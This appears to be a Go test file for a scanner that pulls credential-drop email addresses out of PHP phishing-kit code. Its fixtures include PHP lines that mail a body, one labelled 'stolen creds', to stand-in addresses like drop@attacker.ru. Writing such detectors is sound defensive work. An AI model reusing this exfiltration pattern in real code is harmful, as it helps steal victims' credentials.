package main

import (
	"testing"
)

func TestMailDrops_LiteralFirstArg(t *testing.T) {
	const src = `<?php
mail("drop@attacker.ru", "subject", $body);
mb_send_mail('backup@attacker.ru', 'subject', $body);
wp_mail("third@attacker.ru", "subject", $body);
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	for _, want := range []string{"drop@attacker.ru", "backup@attacker.ru", "third@attacker.ru"} {
		if _, ok := acc.mailDrops[want]; !ok {
			t.Errorf("missing literal drop %q in %v", want, sortedKeys(acc.mailDrops))
		}
	}
}

func TestMailDrops_VariableAssignedThenPassed(t *testing.T) {
	const src = `<?php
$to = "drop@attacker.ru";
$subject = "stolen creds";
mail($to, $subject, $body);
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	if _, ok := acc.mailDrops["drop@attacker.ru"]; !ok {
		t.Errorf("expected drop@attacker.ru via variable trace, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestMailDrops_MultipleAssignmentsOfSameVariable(t *testing.T) {
	// Some kits use a runtime branch — both assigned values could be live
	// drops. Capture both.
	const src = `<?php
if ($region == "eu") {
    $to = "eu-drop@attacker.ru";
} else {
    $to = "us-drop@attacker.ru";
}
mail($to, $subject, $body);
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	for _, want := range []string{"eu-drop@attacker.ru", "us-drop@attacker.ru"} {
		if _, ok := acc.mailDrops[want]; !ok {
			t.Errorf("missing %q in %v", want, sortedKeys(acc.mailDrops))
		}
	}
}

func TestMailDrops_ErrorSuppressedCall(t *testing.T) {
	const src = `<?php @mail("silent@attacker.ru", "x", $body); ?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	if _, ok := acc.mailDrops["silent@attacker.ru"]; !ok {
		t.Errorf("expected @mail() recipient extracted, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestMailDrops_IgnoresNonEmailFirstArg(t *testing.T) {
	const src = `<?php
mail("Drop: drop@bad.com", $subject, $body);  // not a valid email
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	if len(acc.mailDrops) != 0 {
		t.Errorf("expected no drops from non-email literal, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestMailDrops_FiltersPlaceholders(t *testing.T) {
	const src = `<?php
mail("admin@example.com", "x", $body);
mail("test@test", "x", $body);
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	if len(acc.mailDrops) != 0 {
		t.Errorf("expected placeholders filtered, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestMailDrops_IgnoresUnrelatedMailIdentifiers(t *testing.T) {
	const src = `<?php
$customer_email = "user@example.com";
$gmail_address = "user@gmail.com";
function send_mail($to) { return mail($to, "x", "y"); }
?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src))
	// The mail($to,...) inside the function uses $to but there's no
	// assignment of $to to a literal email, so no drops should be
	// reported. "send_mail" is also not a real mail() callsite.
	if len(acc.mailDrops) != 0 {
		t.Errorf("expected no drops, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestMailDrops_DedupAcrossFiles(t *testing.T) {
	const src1 = `<?php mail("drop@attacker.ru", "x", $body); ?>`
	const src2 = `<?php $to = "drop@attacker.ru"; mail($to, "x", $body); ?>`
	acc := newAnalyzer(nil)
	acc.scan([]byte(src1))
	acc.scan([]byte(src2))
	if len(acc.mailDrops) != 1 {
		t.Errorf("expected 1 unique drop after dedup, got %v", sortedKeys(acc.mailDrops))
	}
}

func TestVariableHead(t *testing.T) {
	cases := map[string]string{
		"$to":              "$to",
		"$to[0]":           "$to",
		"$config['drop']":  "$config",
		"$x":               "$x",
		"$":                "",
		"notvar":           "",
		"$camelCase_99":    "$camelCase_99",
	}
	for in, want := range cases {
		if got := variableHead(in); got != want {
			t.Errorf("variableHead(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestParseStringLiteral(t *testing.T) {
	cases := []struct {
		in      string
		val     string
		wantOK  bool
	}{
		{`"hello"`, "hello", true},
		{`'world'`, "world", true},
		{`  "spaced"  `, "spaced", true},
		{`$variable`, "", false},
		{`base64_decode("...")`, "", false},
		{``, "", false},
		{`"`, "", false},
	}
	for _, c := range cases {
		val, ok := parseStringLiteral(c.in)
		if ok != c.wantOK || val != c.val {
			t.Errorf("parseStringLiteral(%q) = (%q, %v), want (%q, %v)", c.in, val, ok, c.val, c.wantOK)
		}
	}
}
